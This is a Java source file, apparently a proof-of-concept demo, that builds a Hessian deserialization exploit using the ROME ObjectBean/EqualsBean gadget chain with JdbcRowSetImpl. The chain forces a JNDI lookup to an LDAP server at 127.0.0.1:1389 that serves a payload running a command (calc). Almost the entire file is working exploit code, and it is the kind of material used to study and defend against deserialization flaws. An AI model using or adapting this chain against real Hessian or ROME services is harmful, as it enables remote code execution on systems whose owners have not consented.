package rome;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.util.HashMap;

public class HessianDemo2 {
    public static void main(String[] args) throws SQLException, NoSuchFieldException, IllegalAccessException, IOException {
//        //构造JdbcRowSetImpl对象
        JdbcRowSetImpl jdbcRowSet=new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/Basic/Command/calc");


        //Rome利用
        ObjectBean delegate = new ObjectBean(JdbcRowSetImpl.class,jdbcRowSet);

        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "xsw6"));

        HashMap<Object, Object> map = new HashMap<>();
        map.put(root, "xs");

        Field field = ObjectBean.class.getDeclaredField("_equalsBean");
        field.setAccessible(true);
        field.set(root, new EqualsBean(ObjectBean.class, delegate));



        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        hessianOutput.writeObject(map);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();





    }

}
